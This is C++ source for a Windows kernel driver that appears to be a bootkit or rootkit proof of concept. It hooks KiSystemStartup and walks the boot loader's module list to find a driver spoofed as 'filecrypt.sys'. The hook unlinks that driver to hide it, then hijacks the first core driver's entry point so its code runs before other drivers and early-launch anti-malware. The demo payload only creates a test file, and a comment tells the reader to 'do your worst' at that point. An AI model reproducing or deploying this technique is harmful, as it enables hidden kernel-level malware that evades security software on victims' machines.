#pragma once
#pragma warning(disable: 4201)
#include <ntifs.h>
#define PHNT_MODE PHNT_MODE_KERNEL
#include <phnt.h>

#define SPOOFED_DRIVER L"filecrypt.sys"

struct LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	PVOID EntryPointActivationContext;
	PVOID PatchInformation;
};

struct BOOT_DRIVER_LIST_ENTRY
{
	LIST_ENTRY Link;
	UNICODE_STRING FilePath;
	UNICODE_STRING RegistryPath;
	LDR_DATA_TABLE_ENTRY* DriverLdrTableEntry;
	ULONG Unknown0;
	ULONG Unknown1;
};

struct LOADER_PARAMETER_BLOCK
{
	ULONG OsMajorVersion;
	ULONG OsMinorVersion;
	ULONG Size;
	ULONG OsLoaderSecurityVersion;
	LIST_ENTRY LoadOrderListHead;
	LIST_ENTRY MemoryDescriptorListHead;
	LIST_ENTRY BootDriverListHead;
	LIST_ENTRY EarlyLaunchListHead;
	LIST_ENTRY CoreDriverListHead;
	LIST_ENTRY CoreExtensionsDriverListHead;
	LIST_ENTRY TpmCoreDriverListHead;
	ULONG KernelStack;
	ULONG Prcb;
	ULONG Process;
	ULONG Thread;
	ULONG KernelStackSize;
	ULONG RegistryLength;
	PVOID RegistryBase;
};

DRIVER_INITIALIZE* g_SpoofedDriverStart = nullptr;

// note that these parameter values will be copied from the first core driver
static void DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	HANDLE file;
	OBJECT_ATTRIBUTES attrs;
	UNICODE_STRING fileName;
	IO_STATUS_BLOCK ioStatus;
	
	// Windows is fully initialized. Do your worst.

	RtlInitUnicodeString(&fileName, L"\\??\\C:\\test.txt");
	InitializeObjectAttributes(&attrs, &fileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	ZwCreateFile(
		&file, GENERIC_READ, &attrs, &ioStatus, NULL,
		FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
		FILE_NON_DIRECTORY_FILE, NULL, 0);

	ZwClose(file);
}

// note that these parameter values will be copied from the first core driver
static NTSTATUS BootDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	// The kernel is initialized but drivers are not.

	IoRegisterBootDriverReinitialization(DriverObject, (DRIVER_REINITIALIZE*)DriverEntry, RegistryPath);

	//DbgBreakPoint();

	return g_SpoofedDriverStart(DriverObject, RegistryPath);
}

extern "C"
void HookedKiSystemStartup
(
	LOADER_PARAMETER_BLOCK* LoaderBlock,
	int DeclaredToPullNextParamFromR8,
	void (*KiSystemStartup)(LOADER_PARAMETER_BLOCK*))
{
	UNREFERENCED_PARAMETER(DeclaredToPullNextParamFromR8);

	// The kernel is not initialized. Most API calls will not work!

	auto loadHead = &LoaderBlock->LoadOrderListHead;
	for (auto loadEntry = loadHead->Flink; loadEntry != loadHead; loadEntry = loadEntry->Flink)
	{
		auto bootDriver = (LDR_DATA_TABLE_ENTRY*)loadEntry;

		// find the driver we spoofed
		if (!wcsncmp(SPOOFED_DRIVER, bootDriver->BaseDllName.Buffer, bootDriver->BaseDllName.Length))
		{
			// unlink to:
			//	- hide from the module list
			//	- prevent this function from being called again
			//  - allow the original driver to load after initialization
			RemoveEntryList(loadEntry);
			
			// core drivers are initialized before ELAM drivers
			auto firstCoreDriver = (BOOT_DRIVER_LIST_ENTRY*)LoaderBlock->CoreDriverListHead.Flink;

			// save entry point for later
			g_SpoofedDriverStart = (DRIVER_INITIALIZE*)firstCoreDriver->DriverLdrTableEntry->EntryPoint;

			// overwrite pointer to get execution after kernel initialization but before other drivers
			firstCoreDriver->DriverLdrTableEntry->EntryPoint = BootDriverEntry;

			break;
		}
	}

	KiSystemStartup(LoaderBlock);
}